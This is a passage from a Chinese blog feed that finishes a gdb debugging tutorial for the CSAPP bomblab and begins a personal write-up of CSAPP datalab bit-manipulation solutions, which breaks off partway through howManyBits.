字符(c). 具体可通过h x查看</li><li>width: 一个单元的宽度, 常见单位为 byte 8bit(b), half word 16bit(h), word 32bit (w), gaint 64bit(g). 同样,可通过h x查看.</li></ul><p>下面就用一些例子来说明吧.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">10</span>] = <span class="string">&quot;hello&quot;</span>;</span><br></pre></td></tr></table></figure><p>现在,要以 字符形式打印buf. 应该怎么写命令?</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x /10cb buf</span><br></pre></td></tr></table></figure><ul><li>10: 代表10个单元</li><li>c: 代表以字符形式打印</li><li>b: 一个单元1个字节,(从语言中的char的长度为1)</li></ul><p>又如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x /4dw arr</span><br></pre></td></tr></table></figure><ul><li>4: 4个单元</li><li>d: 十进制打印</li><li>w: 一个单元32bit</li></ul><p>ok, 到这里基本的调试操作应该都满足了, 如果遇到什么不知道的,直接百度或者查看help吧。</p><h2 id="2-反汇编"><a href="#2-反汇编" class="headerlink" title="2. 反汇编"></a>2. 反汇编</h2><p>gdb也是支持反汇编的, 这也是bomblab必备的能力.</p><p>同样以下面代码为例:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findSquare</span><span class="params">(<span class="keyword">int</span> a)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> a * a; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">char</span>** args)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">int</span> a = atoi(args[i]); </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; findSquare(a) &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>演示如何反汇编.</p><p>启动gdb,  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b main</span><br><span class="line">r 1</span><br></pre></td></tr></table></figure><p>通过 disassemble命令进行反汇编.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621161232831.png" alt="image-20200621161232831"></p><p>如果指向反汇编时,添加源代码和行号, 执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble &#x2F;s</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621161438046.png" alt="image-20200621161438046"></p><p>上面的命令用来临时看看汇编还可以, 但是要跟踪还是得使用layout命令.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">layout asm</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621161534374.png" alt="image-20200621161534374"></p><h3 id="问题1-为某个特定的指令地址加断点"><a href="#问题1-为某个特定的指令地址加断点" class="headerlink" title="问题1: 为某个特定的指令地址加断点"></a>问题1: 为某个特定的指令地址加断点</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *address</span><br><span class="line">b *(function_name + offset)</span><br></pre></td></tr></table></figure><p>如:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621161656224.png" alt="image-20200621161656224"></p><p>ok, gdb的简单使用就到这里了.</p><p><strong>还有个打断点的方式是, 代码走到了指令的位置, 直接输入b, 就在当前位置打了断点.</strong></p><h3 id="问题2：-导出汇编代码"><a href="#问题2：-导出汇编代码" class="headerlink" title="问题2： 导出汇编代码"></a>问题2： 导出汇编代码</h3><p>好吧，这个我并不知道如何用gdb实现， 改用 objdump -d 命令即可实现。</p><h2 id="3-额外推荐"><a href="#3-额外推荐" class="headerlink" title="3. 额外推荐"></a>3. 额外推荐</h2><p>cgdb: gdb的包装， 默认打开了源代码试图，而且采用了vim模式查看源代码，熟悉vim和gdb的可以试试。</p><p>gdbgui: 这个还不错, 采用browser进行调试,比只使用gdb还是好多了.</p><h2 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZ2Vla3Nmb3JnZWVrcy5vcmcvZ2RiLWNvbW1hbmQtaW4tbGludXgtd2l0aC1leGFtcGxlcy8=" title="https://www.geeksforgeeks.org/gdb-command-in-linux-with-examples/">gdb command in Linux with examples - GeeksforGeeks<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhaWR1XzI0MjU2NjkzL2FydGljbGUvZGV0YWlscy80NzI5ODUxMw==" title="https://blog.csdn.net/baidu_24256693/article/details/47298513">gdb中x的用法_lxy的专栏-CSDN博客_gdb x<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbmdjaHV3YW5nMTg2OC9hcnRpY2xlL2RldGFpbHMvODYxMzIyODE=" title="https://blog.csdn.net/songchuwang1868/article/details/86132281">GDB常用命令与技巧（超好用的图形化gdbgui）_Likes的博客-CSDN博客_gdbgui<i class="fa fa-external-link"></i></span></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一直用惯了IDE集成的debug工具, 忽略了gdb这个命令行debug工具. 而最近在做csapp的bomblab, 就不得不来学习它了. 所以特此记录.&lt;/p&gt;
&lt;h2 id=&quot;1-基本使用&quot;&gt;&lt;a href=&quot;#1-基本使用&quot; class=&quot;headerlink&quot; title=&quot;1. 基本使用&quot;&gt;&lt;/a&gt;1. 基本使用&lt;/h2&gt;&lt;p&gt;考虑以下我们在IDE中要进行debug一般需要哪些功能?&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;设置断点(包含条件断点)&lt;/li&gt;
&lt;li&gt;开启debug&lt;/li&gt;
&lt;li&gt;step in, step over, continue&lt;/li&gt;
&lt;li&gt;观察某些值的变化, 打印数组value, 打印某个地址value&lt;/li&gt;
&lt;li&gt;函数调用stack, 切换stack&lt;/li&gt;
&lt;li&gt;临时更改某个变量,参数的值&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下面讲解如何用gdb实现这些功能。&lt;/p&gt;
&lt;p&gt;为了更方便讲解, 这里提前把所有常用命令贴出, 读者可不用一一记住, 在逐渐使用的过程中,自然就能形成记住了.&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://www.ravenxrz.ink/categories/Linux/"/>
    
    
      <category term="gdb" scheme="https://www.ravenxrz.ink/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>Csapp-Datalab详解</title>
    <link href="https://www.ravenxrz.ink/archives/2d758396.html"/>
    <id>https://www.ravenxrz.ink/archives/2d758396.html</id>
    <published>2020-06-19T13:58:03.000Z</published>
    <updated>2020-09-06T07:37:36.750Z</updated>
    
    <content type="html"><![CDATA[<p>准备把csapp详细看一遍，所有lab都做一遍，加深理解。</p><p>本篇是datalab的个人解法，<strong>所以很可能不是最优解</strong>。</p><p>原课程地址：<span class="exturl" data-url="aHR0cDovL3d3dy5jcy5jbXUuZWR1L2Fmcy9jcy9hY2FkZW1pYy9jbGFzcy8xNTIxMy1mMTUvd3d3L3NjaGVkdWxlLmh0bWw=" title="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/schedule.html">http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/schedule.html<i class="fa fa-external-link"></i></span></p><p>ok，现在就来一道道题说明。</p><h2 id="0-说明"><a href="#0-说明" class="headerlink" title="0. 说明"></a>0. 说明</h2><p>datalab着重于让学生理解 数字（integer，float point)在bit level上的表示与操作。通过限制学生的操作集（如仅能使用 ~, |, +等此操作），让学生在bit level上思考问题。</p><a id="more"></a><p>more detail:</p><p><strong>对于Integer类型的题型：</strong></p><ol><li>所能使用的常量范围在 0 - 255之间；</li><li>只能使用函数参数和局部变量；</li><li>有限操作集， ！，~， &amp; ^ | + &lt;&lt;  &gt;&gt; （每道题有各自详细的操作集解释）</li><li>不能使用任何的 if, else, do, while, for, switch等</li><li>不能使用marco</li><li>不能调用函数</li><li>不能使用 &amp;&amp; ||  -  ？</li><li>不能使用类型转换</li><li>不能自定义任何类型（如struct， union， array等），实际上，所有题型都只能使用int</li></ol><p><strong>程序环境说明：</strong></p><ol><li>程序为32位程序，</li><li>右移操作默认为算数右移（也就是补充符号位）</li></ol><p><strong>对于float类型的题型：</strong></p><p>可以使用， if, else, loop等。只能使用int, unsigned类型。</p><p>不能，定义宏，调用函数，类型转换，自定义类型，使用任何float类型的操作。</p><h2 id="1-bitXor"><a href="#1-bitXor" class="headerlink" title="1. bitXor"></a>1. bitXor</h2><p>题目：</p><ul><li>目标：实现x ^ y. </li><li>限制：只能使用操作符 ~, &amp;</li><li>最大操作次数： 14</li><li>难度：1</li></ul><p>解法：</p><p>这道题，我是从“数字电路”中的真值表去思考的，异或操作的真值表如下:</p><table><thead><tr><th align="center">X</th><th align="center">Y</th><th align="center">Z</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">0</td><td align="center">0</td></tr><tr><td align="center">0</td><td align="center">1</td><td align="center">1</td></tr><tr><td align="center">1</td><td align="center">0</td><td align="center">1</td></tr><tr><td align="center">1</td><td align="center">1</td><td align="center">0</td></tr></tbody></table><p>所以可列：<br>$$<br>X \overline{Y} + \overline{X}Y = Z<br>$$<br>利用两次反，数不变原则，可变形为:<br>$$<br>\overline{ (\overline{X\overline{Y}})(\overline{\overline{X}Y}) } = Z<br>$$<br>则可得:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">return</span> ~(  (~(x &amp; ~y))) &amp; (~(~x &amp; y)  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-tmin"><a href="#2-tmin" class="headerlink" title="2. tmin"></a>2. tmin</h2><p>题目：</p><ul><li>目标：返回最小补码数 ，即0x80000000. </li><li>限制：只能使用操作符  ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>最大操作次数： 4</li><li>难度：1</li></ul><p>解法：</p><p>这个题应该是最简单的了，没什么可说的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-isTmax"><a href="#3-isTmax" class="headerlink" title="3. isTmax"></a>3. isTmax</h2><p>题目：</p><ul><li>目标：判断x是否是Tmax，如果是，返回1，否则返回0。</li><li>限制：只能使用操作符  ! ~ &amp; ^ | +</li><li>最大操作次数： 10</li><li>难度：2</li></ul><p>解法：</p><p>既然是要判断x == Tmax，那么就要思考Tmax的特殊性。 Tmax = 0x7f ff ff ff.</p><p>观察到一个性质， Tmax+1 = ~Tmax. 即<br>$$<br>0X7fffffff+1 = \sim0X80000000<br>$$<br>但是还得想一下，还有其它数，有相同的性质吗？</p><p>yes，的确有 ， 0xff ff ff ff也满足这样的性质。</p><p>所以，现在问题需要加一个过滤，把0xff ff ff ff过滤掉。如何过滤呢？这就要思考 0x7f ff ff ff和0xff ff ff ff的不同了。</p><p>又观察到0xff ff ff ff+1 = 0，而0x7f ff ff ff + 1 = 0x80 00 00 00。  所以，可以利用这个特性，把0xff ff ff ff给过滤掉。 <strong>具体是采用 !! 运算。</strong></p><p>对于!! 来说：</p><table><thead><tr><th>运算</th><th>原</th><th>运算后</th></tr></thead><tbody><tr><td>!!</td><td>0</td><td>0</td></tr><tr><td>!!</td><td>非0</td><td>1</td></tr></tbody></table><p>所以有： !!(0x7f ff ff ff + 1) = 1, 而!!(0xff ff ff ff+1) = 0。</p><p>于是，代码为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !((x + <span class="number">1</span>) ^ ~x) &amp; !!(x + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-allOddBits"><a href="#4-allOddBits" class="headerlink" title="4. allOddBits"></a>4. allOddBits</h2><p>题目：</p><ul><li>目标：如果x的二进位的所有奇数位全位1，则返回1，否则返回0。 <em>注：二进制最低位是第0位。</em></li><li>例子：allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</li><li>限制：只能使用操作符! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>最大操作次数： 12</li><li>难度：2</li></ul><p>解法：</p><p> 这个题目难度不大,生成0xaa aa aa aa即可，然后判定是否相同即可（通过异或+! 可以判定）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = <span class="number">0xaa</span>;</span><br><span class="line">    temp = temp &lt;&lt; <span class="number">8</span> | temp; <span class="comment">// 0x aa aa</span></span><br><span class="line">    temp = temp &lt;&lt; <span class="number">8</span> | temp; <span class="comment">// 0x aa aa aa</span></span><br><span class="line">    temp = temp &lt;&lt; <span class="number">8</span> | temp; <span class="comment">// 0x aa aa aa aa</span></span><br><span class="line">    <span class="keyword">return</span> !((x &amp; temp) ^ temp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-negate"><a href="#5-negate" class="headerlink" title="5. negate"></a>5. negate</h2><p>题目：</p><ul><li>目标：返回-x</li><li>限制：只能使用操作符 ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>最大操作次数：5</li><li>难度：2</li></ul><p>解法：</p><p>这题也很简单，取反+1即可，算是一个二进制的公式吧。只是要记住  -Tmin = Tmin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (~x) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-isAsciiDigit"><a href="#6-isAsciiDigit" class="headerlink" title="6. isAsciiDigit"></a>6. isAsciiDigit</h2><p>题目：</p><ul><li>目标： return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters ‘0’ to ‘9’)</li><li>例子：<ul><li>isAsciiDigit(0x35) = 1.</li><li>isAsciiDigit(0x3a) = 0.</li><li>isAsciiDigit(0x05) = 0.</li></ul></li><li>限制：只能使用操作符   ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>最大操作次数：15</li><li>难度：3</li></ul><p>解法：</p><p>这道题的整体思路也比较简单，考虑一个更通用的方法， 如何判定 x&lt;=y?  也就是 x- y &lt;= 0. 即 x-y 的符号位为1即可（这里没有考虑负溢出问题）。</p><p>所以看代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> acsii_zero = <span class="number">0x30</span>;</span><br><span class="line">    <span class="keyword">int</span> acsii_nine = <span class="number">0x39</span>;</span><br><span class="line">    <span class="keyword">int</span> negative_acsii_zero = ~acsii_zero + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> negative_acsii_nine = ~acsii_nine + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> result1 = !(((x + negative_acsii_zero) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>); <span class="comment">//0x30 &lt;= x</span></span><br><span class="line">    <span class="keyword">int</span> result2 = ((x + negative_acsii_nine) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;    <span class="comment">// x &lt; 0x39</span></span><br><span class="line">    <span class="keyword">int</span> result3 = !(x + (negative_acsii_nine));             <span class="comment">// x = 0x39</span></span><br><span class="line">    <span class="keyword">return</span> result1 &amp; (result2 | result3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="7-conditional"><a href="#7-conditional" class="headerlink" title="7. conditional"></a>7. conditional</h2><p>题目：</p><ul><li>目标：实现三目运算符  same as x ? y : z </li><li>限制：只能使用操作符   ! ~ &amp; ^ | + &lt;&lt;  &gt;&gt;</li><li>最大操作次数：16</li><li>难度：3</li></ul><p>解法：</p><p>这道题其实颇为巧妙，同样用到了数电中的思想，注意，只是思想，实现起来是不一样的。<br>$$<br>RESULT  = XY +  \overline{X}{Z}<br>$$<br>X=1，则RESULT=Y， X=0，RESULT = Z。</p><p>但是这只是在1bit的情况下，要换算到Integer（32bit）范围内，X要么等于0xff ff ff ff, 要么等于0x0.</p><p><strong>问题转化为:</strong></p><p><strong>如果x = 0，则不做转化。</strong></p><p><strong>如果x= 非0， 则x要转换为0xff ff ff ff。</strong></p><p>这里又要用到 **!!**运算了。</p><p><strong>又观察到,</strong>  </p><p><strong>0 -1 = 0xff ff ff ff</strong></p><p><strong>1 -0 = 0</strong></p><p>所以可写代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// x 为0 flag= 0 , x不为0,flag = 1</span></span><br><span class="line">    <span class="keyword">int</span> flag = !!x;              <span class="comment">// flag =1 or flag = 0</span></span><br><span class="line">    <span class="keyword">int</span> negative_one = ~<span class="number">0x1</span> + <span class="number">1</span>; <span class="comment">// -1</span></span><br><span class="line">    <span class="keyword">return</span> (~(flag + negative_one) &amp; y) | ((flag + negative_one) &amp; z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-isLessOrEqual"><a href="#8-isLessOrEqual" class="headerlink" title="8. isLessOrEqual"></a>8. isLessOrEqual</h2><p>题目：</p><ul><li>目标：如果 x&lt;=y ，则返回1， 否则返回0.</li><li>限制：只能使用操作符   ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>最大操作次数：24</li><li>难度：3</li></ul><p>解法：</p><p>这道题目和前文的 <code>isAsciiDigit</code> 很相似，用的方法也是类似的，所以不赘述。</p><p>个人只是将运算按照 ”一、二、三、四象限“分成了四种情况考虑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> negative_y = ~y + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 取出符号位</span></span><br><span class="line">    <span class="keyword">int</span> sx = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> sy = (y &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// x&gt;y ==&gt; x-y 的符号位一定是0</span></span><br><span class="line">    <span class="keyword">int</span> x_less_equal_than_y = (((x + negative_y) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>) | !(x + negative_y);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// x &lt; 0, y&gt;= 0 sx = 1 sy = 0, x &lt; y</span></span><br><span class="line">    <span class="keyword">int</span> result1 = sx &amp; (!sy);</span><br><span class="line">    <span class="comment">// x &lt; 0 , y &lt; 0 sx = 1, sy = 1, 且 x &lt;= y</span></span><br><span class="line">    <span class="keyword">int</span> result2 = sx &amp; sy &amp; x_less_equal_than_y;</span><br><span class="line">    <span class="comment">// x &gt;=0 , y &gt;= 0, sx =0 , sy = 0, 且 x &lt;= y</span></span><br><span class="line">    <span class="keyword">int</span> result3 = (!sx) &amp; (!sy) &amp; x_less_equal_than_y;</span><br><span class="line">    <span class="comment">// x &gt;=0 , y &lt; 0 , sx = 0, sy = 1, 这里 x &gt; y 需要求反,并且不再其它condition中</span></span><br><span class="line">    <span class="keyword">int</span> result4 = (!sx) &amp; sy;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result1 | result2 | result3 | ((!result4) &amp; result1 &amp; result2 &amp; result3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="9-logicalNeg"><a href="#9-logicalNeg" class="headerlink" title="9. logicalNeg"></a>9. logicalNeg</h2><p>题目：</p><ul><li>目标：实现 ! 操作</li><li>例子： logicalNeg(3) = 0, logicalNeg(0) = 1</li><li>限制：只能使用操作符  ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>最大操作次数：12</li><li>难度：4</li></ul><p>解法：</p><p>这里我的出发点是 0和其它数值有什么不同？</p><p>0的相反数是0. （注意Tmin的相反数也是Tmin）</p><p>所以设：</p><p>y = -x （前文有说-x的bit运算方式）</p><p>如果y的首位是0，则说明，x为0或Tmin。 既然0要映射为1，只要 y&gt;&gt;31 +1即可。</p><p>如果y的首位是1，则说明，x为非零非Tmin的数，这些值要映射为0，同样y&gt;&gt;31 +1 即可（注意是算数右移，所以y&gt;&gt;31 = 0xff ff ff ff)</p><p>现在，剩下的问题为如果区分0 和 Tmin。这个就很简单了。0的符号位为0，Tmin的符号位为1，再运用一次 x&gt;&gt;31+1即可。</p><p>所以，代码为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> negative_x = ~x + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> result1 = ((x ^ negative_x) &gt;&gt; <span class="number">31</span>) + <span class="number">1</span>; <span class="comment">// 相反数判定</span></span><br><span class="line">    <span class="keyword">int</span> result2 = (x &gt;&gt; <span class="number">31</span>) + <span class="number">1</span>;<span class="comment">// 排除Tmin</span></span><br><span class="line">    <span class="keyword">return</span> result1 &amp; result2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-howManyBits"><a href="#10-howManyBits" class="headerlink" title="10. howManyBits"></a>10. howManyBits</h2><p>题目：</p><ul><li>目标： 返回表示一个数（补码形式）所需要的最小bit数。</li><li>例子： <ul><li>howManyBits(12) = 5</li><li>howManyBits(298) = 10</li><li>howManyBits(-5) = 4</li><li>howManyBits(0)  = 1</li><li>howManyBits(-1) = 1</li><li>howManyBits(0x80000000) = 32</li></ul></li><li>限制：只能使用操作符 ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>最大操作次数： 90</li><li>难度：4</li></ul><p>解法：</p><p>这道题难度非常大。我认为是datalab中最难的一道题。如果能使用if，loop就比较简单，但是难就难在不能使用这些运算。</p><p>所以先说一下思路：</p><p>首先从正数出发，如果从最高位到最低位扫描，当你找到首个1时，此时的1所在bit位+1（加1是因为还要个符号位），即是所需要的符号位数量。当然了0是例外。</p><p>问题再稍作转化，<strong>首次扫描到两个相邻的bit位分别是0和1时，就算是找到了所需要的符号位数量。</strong></p><p>再考虑一下负数，思考一下前面的黑体字，”扫描到两个bit位时0和1时，就算找到了“，那把负数的情况是不是就是 <strong>”首次扫描到两个bit位分别为1和0时呢？“</strong> （当然，-1除外）。</p><p>结合正负数，问题变为 <strong>从高位向低位扫描，首次扫描到两个相邻bit位值不同时，就算是找到了所需要的符号位数量</strong>，不过0和-1是特殊值。</p><p>前面说了这么多，其实并不是最终解法，前面说的目的为，<strong>“对于负数，我们可以用对待正数的相同的算法去处理”</strong>，即把负数翻转为正数即可（注意不是取相反数）。</p><p>先看下面代码：</p><p>关键代码1:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果 x&lt; 0, 则翻转x</span></span><br><span class="line"><span class="keyword">int</span> reverse_x = ~x;</span><br><span class="line"><span class="comment">// 使用前面的conditional 来做, 三目运算符</span></span><br><span class="line"><span class="keyword">int</span> negative_one = ~<span class="number">0x1</span> + <span class="number">1</span>; <span class="comment">// -1</span></span><br><span class="line"><span class="keyword">int</span> flag = !(x &gt;&gt; <span class="number">31</span>);</span><br><span class="line">x = (~(flag + negative_one) &amp; x) | ((flag + negative_one) &amp; reverse_x);</span><br></pre></td></tr></table></figure><p>到这里x一定是正数了。</p><p>现在就可以统一处理正负数了。问题是我们仍然无法通过if loop计算需要多少位bit来表示一个数。</p><p>为了更好的说明下面的算法，这里先贴一张图，以5bit数字进行说明：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200619232328439.png" alt="image-20200619232328439"></p><p>现在的关键是如何得到这个 <strong>剩余3bit信息：</strong></p><p>如果可以将当扫描位后的所有位置为1，我们就可以<strong>将问题转化为统计 当前数字的二进制表示 有多少个1了。</strong>（为什么要这么想，因为有<strong>bitcount算法</strong>啊）</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200619232535359.png" alt="image-20200619232535359"></p><p>关键代码2：</p><p>对于32位的数据，可以有：</p><figure class="highlight 